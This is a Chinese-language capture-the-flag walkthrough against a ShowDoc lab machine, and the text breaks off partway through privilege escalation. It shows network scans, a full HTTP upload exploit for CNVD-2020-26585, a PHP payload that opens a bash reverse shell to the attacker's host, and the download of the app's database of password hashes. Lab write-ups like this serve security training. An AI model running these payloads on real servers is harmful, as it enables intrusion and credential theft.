作者：大傻子
靶机id：652

## 主机发现
```zsh
┌──(kali㉿kali)-[~/桌面]
└─$ nmap -sn 10.241.108.0/24
Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-28 16:51 CST
Nmap scan report for 10.241.108.8
Host is up (0.0012s latency).
MAC Address: 08:00:27:35:21:83 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Nmap scan report for 10.241.108.43
Host is up (0.011s latency).
MAC Address: 4E:20:31:25:4A:3C (Unknown)
Nmap scan report for 10.241.108.212
Host is up (0.00060s latency).
MAC Address: 30:E3:A4:48:AC:29 (Unknown)
Nmap scan report for 10.241.108.201
Host is up.
Nmap done: 256 IP addresses (4 hosts up) scanned in 8.08 seconds
```
确定靶机ip：`10.241.108.8`(后来发现给了ip)

## 端口扫描
```zsh
┌──(kali㉿kali)-[~/桌面]
└─$ nmap   10.241.108.8 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-28 16:54 CST
Nmap scan report for 10.241.108.8
Host is up (0.0045s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:35:21:83 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 0.62 seconds
                                                             
```
* 存在80-web端口
## web渗透
发现了web就先访问了一下
![](file-20260428170713217.png)
发现是一个`ShowDoc`的网站，应该是一套通用的源码。直接问ai了。
![](file-20260428171350229.png)
找到了cve直接去搜poc了。
[vulhub/showdoc/CNVD-2020-26585 在主节点 ·vulhub/vulhub ·GitHub](https://github.com/vulhub/vulhub/tree/master/showdoc/CNVD-2020-26585)
poc:
```http
POST /index.php?s=/home/page/uploadImg HTTP/1.1
Host: localhost:8080
Accept-Encoding: gzip, deflate, br
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.159 Safari/537.36
Connection: close
Cache-Control: max-age=0
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary0RdOKBR8AmAxfRyl
Content-Length: 213

------WebKitFormBoundary0RdOKBR8AmAxfRyl
Content-Disposition: form-data; name="editormd-image-file"; filename="test.<>php"
Content-Type: text/plain

<?=phpinfo();?>
------WebKitFormBoundary0RdOKBR8AmAxfRyl--
```
改一下host发包
![](file-20260428172022367.png)
果然得到路径
![](file-20260428172223661.png)
漏洞存在，接下来可以反弹shell了。

```bash
┌──(kali㉿kali)-[~/桌面]
└─$ nc -lvp 7777       
listening on [any] 7777 ...

替换payload为：
<?php exec('bash -c "bash -i >& /dev/tcp/10.241.108.201/7777 0>&1" &'); ?>


```

上传后访问得到的url就可以看到shell反弹了
## 提权
我们现在只有最低的www权限
所以先看一下用户，
```bash
www-data@Show:~/html/Sqlite$ ls -l /home
ls -l /home
total 8
drwx------ 2 l1qin9 l1qin9 4096 Apr 25 22:47 l1qin9
drwx------ 2 mooi   mooi   4096 Apr 25 20:09 mooi

```
有两个用户，都是一样的权限。

然后翻一翻目录，找到了一个`/html/Sqlite/showdoc.db.php`
sqlite的数据库文件，我们看看会不会在数据库中保存了账号密码
起一个python服务，下载下来到Navicat看看。
```bash
#靶机shell:
www-data@Show:~/html/Sqlite$ python3 -m http.server 8080
python3 -m http.server 8080
```

```powershell
#本机shell:
PS D:\webtool\Dirsearch> curl http://10.241.108.8:8080/showdoc.db.php -O "showdoc.db.php"
```
![](file-20260428181149330.png)
打开能看到我自己的用户和一个showdoc目录，但是可惜密码是哈希加密的，cmd5也没爆出来
只能继续去找了，我们找一找配置文件

